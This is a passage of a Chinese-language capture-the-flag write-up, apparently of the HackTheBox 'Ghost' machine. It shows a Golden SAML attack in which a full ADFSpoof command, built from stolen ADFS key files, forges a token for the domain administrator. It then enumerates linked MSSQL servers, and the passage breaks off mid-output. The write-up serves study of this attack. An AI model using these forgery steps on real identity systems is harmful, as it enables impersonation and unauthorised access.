xmlns<span class="punctuation">:</span>samlp=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span> ID=<span class="string">&quot;_42ef7f6b-b3c3-462f-8ac0-8233a276b4cd&quot;</span> Version=<span class="string">&quot;2.0&quot;</span> IssueInstant=<span class="string">&quot;2024-07-18T17:44:47.970Z&quot;</span> Destination=<span class="string">&quot;https://core.ghost.htb:8443/adfs/saml/postResponse&quot;</span> Consent=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:consent:unspecified&quot;</span> InResponseTo=<span class="string">&quot;_b1549c4f16e43df9221b90896189acf09d0d596b&quot;</span>&gt;</span><br><span class="line">  &lt;Issuer xmlns=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span>&gt;http<span class="punctuation">:</span><span class="comment">//federation.ghost.htb/adfs/services/trust&lt;/Issuer&gt;</span></span><br><span class="line">  &lt;samlp<span class="punctuation">:</span>Status&gt;</span><br><span class="line">    &lt;samlp<span class="punctuation">:</span>StatusCode Value=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;</span>/&gt;</span><br><span class="line">  &lt;/samlp<span class="punctuation">:</span>Status&gt;</span><br><span class="line">  &lt;Assertion xmlns=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;</span> ID=<span class="string">&quot;_12ec6999-8066-4caa-b794-b43e8d2f8408&quot;</span> IssueInstant=<span class="string">&quot;2024-07-18T17:44:47.970Z&quot;</span> Version=<span class="string">&quot;2.0&quot;</span>&gt;</span><br><span class="line">    &lt;Issuer&gt;http<span class="punctuation">:</span><span class="comment">//federation.ghost.htb/adfs/services/trust&lt;/Issuer&gt;</span></span><br><span class="line">    &lt;ds<span class="punctuation">:</span>Signature xmlns<span class="punctuation">:</span>ds=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span><br><span class="line">      &lt;ds<span class="punctuation">:</span>SignedInfo&gt;</span><br><span class="line">        &lt;ds<span class="punctuation">:</span>CanonicalizationMethod Algorithm=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span><br><span class="line">        &lt;ds<span class="punctuation">:</span>SignatureMethod Algorithm=<span class="string">&quot;http://www.w3.org/2001/04/xmldsig-more#rsa-sha256&quot;</span>/&gt;</span><br><span class="line">        &lt;ds<span class="punctuation">:</span>Reference URI=<span class="string">&quot;#_12ec6999-8066-4caa-b794-b43e8d2f8408&quot;</span>&gt;</span><br><span class="line">          &lt;ds<span class="punctuation">:</span>Transforms&gt;</span><br><span class="line">            &lt;ds<span class="punctuation">:</span>Transform Algorithm=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;</span>/&gt;</span><br><span class="line">            &lt;ds<span class="punctuation">:</span>Transform Algorithm=<span class="string">&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;</span>/&gt;</span><br><span class="line">          &lt;/ds<span class="punctuation">:</span>Transforms&gt;</span><br><span class="line">          &lt;ds<span class="punctuation">:</span>DigestMethod Algorithm=<span class="string">&quot;http://www.w3.org/2001/04/xmlenc#sha256&quot;</span>/&gt;</span><br><span class="line">          &lt;ds<span class="punctuation">:</span>DigestValue&gt;LMI6frwfXXo2RnE5VjSQ52hBKr7VNoUTsB5HgGed9cs=&lt;/ds<span class="punctuation">:</span>DigestValue&gt;</span><br><span class="line">        &lt;/ds<span class="punctuation">:</span>Reference&gt;</span><br><span class="line">      &lt;/ds<span class="punctuation">:</span>SignedInfo&gt;</span><br><span class="line">      &lt;ds<span class="punctuation">:</span>SignatureValue&gt;sA170irdugiB9NIbsRujfqojCIGbINBxIr2WU6Uk8iZK6IAOngkvPWdhH3rZ3n0REKCy9JNCevu+jRKe2rvnJzVZmSTPv7AhVX5QFegNoznR6x/MUOWnXES7WFJW146lB5r7mvVYKaWB1AbosHEx2j7VBK8sr/GOs9bRA3DpyFJuHute7EiUOOw3EfPDb5WRZI+tlaVNkOqnopaD59Jf5GpVkju7bMxaoZRED2sb+<span class="number">1</span>VkCXwJfO0LiWGgeeptoBu89bQY4sVqz4WXAR5qQmClc3xWyTIox4kyt02OBI/VTfRp2JUBy36oKDEtO0Sxbsx3mqux4E+QY6uGDKD3w/pG83VczhEFUVQ1VrUKWdLG77VUtpiSxb5xZuQsDZQaswTyfBjcMhoHcZTTu6A7hBkgT7Gi7863NJxt185gXwfKvfUymJcFfzwiPMFaFXENJI2UQOo7xgo3uLDlWvt3nBXMGO6hPPRTLgdtxqq9SLdp3m/eRJk+<span class="number">6</span>DQ/M9ShgZZd7JWZSHjwk3RlYfthaU+qcuFa5752nS+gOlc6kA+zVjfaA4GkNHZyYbCFn5gWidRRaODH8JhdhJiPqDHETg1Q6kAAksDiTXoSZl+N0F/xPEUx2hVcvzKXUlRpA+UINFmljRO+FWZuPHidz4oT4+uhm+NSZGQguubrCfrMImviRP1LER0=&lt;/ds<span class="punctuation">:</span>SignatureValue&gt;</span><br><span class="line">      &lt;KeyInfo xmlns=<span class="string">&quot;http://www.w3.org/2000/09/xmldsig#&quot;</span>&gt;</span><br><span class="line">        &lt;ds<span class="punctuation">:</span>X509Data&gt;</span><br><span class="line">          &lt;ds<span class="punctuation">:</span>X509Certificate&gt;MIIE5jCCAs6gAwIBAgIQJFcWwMybRa5O4+WO5tWoGTANBgkqhkiG9w0BAQsFADAuMSwwKgYDVQQDEyNBREZTIFNpZ25pbmcgLSBmZWRlcmF0aW9uLmdob3N0Lmh0YjAgFw0yNDA2MTgxNjE3MTBaGA8yMTA0MDUzMDE2MTcxMFowLjEsMCoGA1UEAxMjQURGUyBTaWduaW5nIC0gZmVkZXJhdGlvbi5naG9zdC5odGIwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQC+AAOIfEqtlYcn153L1BvGQgDyXTnYwTRzsK59+zE1zgGKO9N5nb8Fk+daKpWLQaiH7oDHaenw/QaxBg5qdeDYmD3oz8KyaA1ygYBrzm4wW7Ff87rK9Fe5J5/h6W9g749h5BIqPQOp0l6s1rfumOccN4ybW95EWNL0vuQXvC+KQ4D4gMXu8mCGpxtvIL8ilNtJuIG3ORYSKhRal0yyJeOhG4xglrZJF18p9whnE6omggmA6n2shDk/tvTYjii5e7/icWTKkrsMCpaKUNk7mxdMZhQab7SmfKrZN4pRD7dVg5zzIyD7UzS9CHLC6xNzq/Z0huaOaJhOSdJSgat/bsG8nbx19HD/+ypW9J2LtNFugdWtmUBWDOQBYVhB8Sg4VEGgP9jyItHH2bzsDfjRdJ8E1uNJWP/kQA1+wYlOddLqU3b0IsCvlA8EvYW0T1Rsu77o4x/w0gWb0oQPEIz7z973b496wqQt3DnyfeO3lXXfZNcvaj5KCP2TtGB+KshF9pkIPxq7F2gMh7QjxjRHsA29V8jFo9gLD7kPVicaIUdsgiFHnYQF14a52JtR1V5iN+h95JkuuEqQWDBHAvPEBBZkEZH+<span class="number">5</span>yT+aCFXXX+BpPt3QGjYLeJU8CFsMtn8QVLYvLdcVRsUnRh/WHiXwJOOEVECa9w7/yVnhalCNBx1E/l4KQIDAQABMA0GCSqGSIb3DQEBCwUAA4ICAQAWYKZW3cDCBO6dT3yfl3Ocuyp1LVKVI+<span class="number">9</span>pFx/bbWpWjSdh6b39LTxxD7FYUthuWPZ3rF4G+FdMFHHCx3YpEmUFnELKsXqhZ989AX58I/<span class="number">3</span>mbfUlKWeIPLSLkp+eRZoMJkt7k1/KXtDasOQn0NsgYEowLBImMCMu9uujnCmFOwHP/IBhgYQMHh46BzSXWP3i8VXbrRtDpo/c<span class="comment">//OFJhGmnnF8ZPmi4xtzfSDBpVKqwVLp78CguMxjQd+bdUb45588ZJ4CLsPdRQp30WJ1/CNIaenvJWtA2G5IZw5U0EWCJLoYJWFs9iyOa1/y55ruW6J8lIGD0wmoEeCl9CH1Ed4dzUdUXf1MBCYP3X92iaxzUE0upGd/1Qo6HTyyOlWuAwrkT2VHELKVZKOg8+dly97gyZIfUtQwIkPwNl8vo04cfj+hzOvBzPKAAYh14NLgveAI/DqMnO0OKO+w1HBKw64NBCn8goazF+PuFfUO0yNHFL4kxMpcap6iev6g3BXCSDwfqTUOEuEs7q9oYKgq2qnNVOTIhhInMXBzEm6iP13jfuOoXJdPAnEUXn4y5ywA97rtbGnZEPyx1f1EkX/hbqBP4vogv9kltaUEEVXkS+hPpxZmexCNrBD1q7GJ/50ebYlC0Cev8w6Ms8tM0OrvppGYlWrtPwevEvfiRkwBLG7EMAnLSw==&lt;/ds:X509Certificate&gt;</span></span><br><span class="line">        &lt;/ds<span class="punctuation">:</span>X509Data&gt;</span><br><span class="line">      &lt;/KeyInfo&gt;</span><br><span class="line">    &lt;/ds<span class="punctuation">:</span>Signature&gt;</span><br><span class="line">    &lt;Subject&gt;</span><br><span class="line">      &lt;SubjectConfirmation Method=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;</span><br><span class="line">        &lt;SubjectConfirmationData InResponseTo=<span class="string">&quot;_b1549c4f16e43df9221b90896189acf09d0d596b&quot;</span> NotOnOrAfter=<span class="string">&quot;2024-07-18T17:49:47.970Z&quot;</span> Recipient=<span class="string">&quot;https://core.ghost.htb:8443/adfs/saml/postResponse&quot;</span>/&gt;</span><br><span class="line">      &lt;/SubjectConfirmation&gt;</span><br><span class="line">    &lt;/Subject&gt;</span><br><span class="line">    &lt;Conditions NotBefore=<span class="string">&quot;2024-07-18T17:44:47.970Z&quot;</span> NotOnOrAfter=<span class="string">&quot;2024-07-18T18:44:47.970Z&quot;</span>&gt;</span><br><span class="line">      &lt;AudienceRestriction&gt;</span><br><span class="line">        &lt;Audience&gt;https<span class="punctuation">:</span><span class="comment">//core.ghost.htb:8443&lt;/Audience&gt;</span></span><br><span class="line">      &lt;/AudienceRestriction&gt;</span><br><span class="line">    &lt;/Conditions&gt;</span><br><span class="line">    &lt;AttributeStatement&gt;</span><br><span class="line">      &lt;Attribute Name=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;</span>&gt;</span><br><span class="line">        &lt;AttributeValue&gt;justin.bradley@ghost.htb&lt;/AttributeValue&gt;</span><br><span class="line">      &lt;/Attribute&gt;</span><br><span class="line">      &lt;Attribute Name=<span class="string">&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;</span>&gt;</span><br><span class="line">        &lt;AttributeValue&gt;justin.bradley&lt;/AttributeValue&gt;</span><br><span class="line">      &lt;/Attribute&gt;</span><br><span class="line">    &lt;/AttributeStatement&gt;</span><br><span class="line">    &lt;AuthnStatement AuthnInstant=<span class="string">&quot;2024-07-18T17:44:28.991Z&quot;</span>&gt;</span><br><span class="line">      &lt;AuthnContext&gt;</span><br><span class="line">        &lt;AuthnContextClassRef&gt;urn<span class="punctuation">:</span>oasis<span class="punctuation">:</span>names<span class="punctuation">:</span>tc<span class="punctuation">:</span>SAML<span class="punctuation">:</span><span class="number">2.0</span><span class="punctuation">:</span>ac<span class="punctuation">:</span>classes<span class="punctuation">:</span>PasswordProtectedTransport&lt;/AuthnContextClassRef&gt;</span><br><span class="line">      &lt;/AuthnContext&gt;</span><br><span class="line">    &lt;/AuthnStatement&gt;</span><br><span class="line">  &lt;/Assertion&gt;</span><br><span class="line">&lt;/samlp<span class="punctuation">:</span>Response&gt;</span><br></pre></td></tr></table></figure>


<p>这块在 <a target="_blank" rel="noopener" href="https://github.com/mandiant/ADFSpoof">https://github.com/mandiant/ADFSpoof</a> 也有提到（我一开始眼瞎了没看到）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A command that encapsulates generating a generic SAML 2.0 security token. Use this module to generate security tokens for arbitrary federated applications that are using SAML 2.0. By reading the data returned by ADFSDump you should be able to generate a valid token for just about any federated application using this module.</span><br><span class="line"></span><br><span class="line">--endpoint ENDPOINT: The recipient of the seucrity token. This should be a full URL.</span><br><span class="line">--nameidformat URN: The value for the &#x27;Format&#x27; attribute of the NameIdentifier tag. This should be a URN.</span><br><span class="line">--nameid NAMEID: The NameIdentifier attribute value.</span><br><span class="line">--rpidentifier IDENTIFIER: The Identifier of the relying party that is receiving the token.</span><br><span class="line">--assertions ASSERTIONS: The assertions that the relying party is expecting. Use the claim rules output by ADFSDump to ascertain this. Should be a single-line (do not include newlines) XML string.</span><br><span class="line">--config FILEPATH: A filepath to a JSON file containing the above arguments. Optional - use this if you don&#x27;t want to supply everything over the command line.</span><br></pre></td></tr></table></figure>

<p>首先是俩密钥文件 目标web 和类型，这个没啥好说的。</p>
<p><code>-b tsk.bin dkm.bin -s federation.ghost.htb saml2</code></p>
<p>比较重点的是后面这些</p>
<p>参考 <a target="_blank" rel="noopener" href="https://nodauf.dev/p/practical-guide-for-golden-saml/">https://nodauf.dev/p/practical-guide-for-golden-saml/</a> 给出的样例</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python ADFSpoof.py -b EncryptedPfx.bin DkmKey.bin  -s adfs.pentest.lab  saml2 --endpoint https://www.contoso.com/adfs/ls</span><br><span class="line">/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid <span class="string">&#x27;PENTEST\administrator&#x27;</span> --rpidentifier Supervision --assertions <span class="string">&#x27;&lt;Attribute Name=&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;&gt;&lt;AttributeValue&gt;PENTEST\administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#x27;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">首先是`endpoint`这个其实比较明确</span><br><span class="line"></span><br><span class="line">```json</span><br><span class="line">&lt;samlp:Response ID=<span class="string">&quot;_42ef7f6b-b3c3-462f-8ac0-8233a276b4cd&quot;</span> Version=<span class="string">&quot;2.0&quot;</span> IssueInstant=<span class="string">&quot;2024-07-18T17:44:47.970Z&quot;</span> Destination=<span class="string">&quot;https://core.ghost.htb:8443/adfs/saml/postResponse&quot;</span> Consent=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:consent:unspecified&quot;</span> InResponseTo=<span class="string">&quot;_b1549c4f16e43df9221b90896189acf09d0d596b&quot;</span> xmlns:samlp=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<p>是发送目标的地址，基本一眼就能确认是 <code>https://core.ghost.htb:8443/adfs/saml/postResponse</code></p>
<p>再是<code>nameidformat</code>这个官方说是个<code> This should be a URN.</code>，特么saml里那么多urn我知道是哪个，所以去查了下 <a target="_blank" rel="noopener" href="https://www.ibm.com/docs/en/security-verify?topic=provider-configuring-saml-subject-mapping-attributes">https://www.ibm.com/docs/en/security-verify?topic=provider-configuring-saml-subject-mapping-attributes</a></p>
<p>他这里<code>nameid format</code>包含在SAML Subject里</p>
<p>看了下作为主题的好像就是只有这一段</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Subject&gt;</span><br><span class="line">      &lt;SubjectConfirmation Method=<span class="string">&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;</span>&gt;</span><br><span class="line">        &lt;SubjectConfirmationData InResponseTo=<span class="string">&quot;_b1549c4f16e43df9221b90896189acf09d0d596b&quot;</span> NotOnOrAfter=<span class="string">&quot;2024-07-18T17:49:47.970Z&quot;</span> Recipient=<span class="string">&quot;https://core.ghost.htb:8443/adfs/saml/postResponse&quot;</span>/&gt;</span><br><span class="line">      &lt;/SubjectConfirmation&gt;</span><br><span class="line">    &lt;/Subject&gt;</span><br></pre></td></tr></table></figure>

<p>也就是<code>urn:oasis:names:tc:SAML:2.0:cm:bearer</code></p>
<p>再就是<code>nameid</code> 这个没啥好说的格局上面的样例也不难看出这里就是要伪造的用户</p>
<p>就应当是<code>ghost.htb\administrator</code></p>
<p>这个<code>rpidentifier</code>给我难住了</p>
<p>然后我找到了这个 <a target="_blank" rel="noopener" href="https://journey.temenos.com/api/1811/fluent-api/com/avoka/tm/security/Saml2Parser.html">https://journey.temenos.com/api/1811/fluent-api/com/avoka/tm/security/Saml2Parser.html</a></p>
<p>以及相应的wiki <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Service_provider_(SAML)">https://en.wikipedia.org/wiki/Service_provider_(SAML)</a></p>
<p>里面这段话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a system entity that issues authentication assertions in conjunction with an SSO profile of SAML.[OS 2] A relying party that consumes such assertions is called a SAML service provider (or simply service provider if the domain is understood).</span><br></pre></td></tr></table></figure>

<p>通俗来说<code>rpidentifier</code>就是，哪个服务或者应用，要接收用户的认证令牌。</p>
<p>根据Saml2Parser.html的来看<code>Audience</code>代表着依赖方。</p>
<p>所以<code> &lt;Audience&gt;https://core.ghost.htb:8443&lt;/Audience&gt;</code>即是要接受我们令牌的服务或者说应用。</p>
<p>根据样例我们只取<code>https://core.ghost.htb:8443</code>即可</p>
<p>再就是<code>assertions</code>这个根据上面师傅的直接找<code>&lt;Attribute Name&gt;</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;Attribute Name=<span class="string">&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;</span>&gt;</span><br><span class="line">  &lt;AttributeValue&gt;justin.bradley@ghost.htb&lt;/AttributeValue&gt;</span><br><span class="line">&lt;/Attribute&gt;</span><br><span class="line">&lt;Attribute Name=<span class="string">&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;</span>&gt;</span><br><span class="line">  &lt;AttributeValue&gt;justin.bradley&lt;/AttributeValue&gt;</span><br><span class="line">&lt;/Attribute&gt;</span><br></pre></td></tr></table></figure>

<p>这里有俩，我试了下都可以，修改成目标user的然后就构成了，我和朋友的差异就是最后的assertions部分</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ADFSpoof.py -b tsk.bin dkm.bin -s federation.ghost.htb saml2 --endpoint https://core.ghost.htb:8443/adfs/saml/postResponse --nameidformat <span class="string">&#x27;urn:oasis:names:tc:SAML:2.0:cm:bearer&#x27;</span> --nameid <span class="string">&#x27;ghost.htb\administrator&#x27;</span> --rpidentifier  <span class="string">&#x27;https://core.ghost.htb:8443&#x27;</span>  --assertions <span class="string">&#x27;&lt;Attribute Name=&quot;http://schemas.xmlsoap.org/claims/CommonName&quot;&gt;&lt;AttributeValue&gt;administrator&lt;/AttributeValue&gt;&lt;/Attribute&gt;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>bp拦住替换掉输出的就可以了。</p>
<p>进来看到是个sql，可算遇到个能执行的sql了..</p>
<p>看了下没啥东西，然后发现有俩数据源</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">select * from master..sysservers</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;srvid&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvstatus&quot;</span><span class="punctuation">:</span> <span class="number">1089</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DC01&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvproduct&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SQL Server&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;providername&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SQLOLEDB&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;datasource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DC01&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;providerstring&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;schemadate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-02-02T20:18:34.940Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;topologyx&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;topologyy&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;catalog&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvcollation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;connecttimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;querytimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvnetname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DC01                          &quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isremote&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;rpc&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;pub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dist&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dpub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;rpcout&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dataaccess&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;collationcompatible&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;system&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;useremotecollation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lazyschemavalidation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;collation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;nonsqlsub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;srvid&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvstatus&quot;</span><span class="punctuation">:</span> <span class="number">1249</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PRIMARY&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvproduct&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SQL Server&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;providername&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SQLOLEDB&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;datasource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PRIMARY&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;location&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;providerstring&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;schemadate&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2024-02-02T20:49:58.430Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;topologyx&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;topologyy&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;catalog&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvcollation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;connecttimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;querytimeout&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;srvnetname&quot;</span><span class="punctuation">:</span> <span class="string">&quot;PRIMARY                       &quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isremote&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;rpc&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;pub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dist&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dpub&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;rpcout&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;dataaccess&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;collationcompatible&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;system&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;useremotecollation&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span 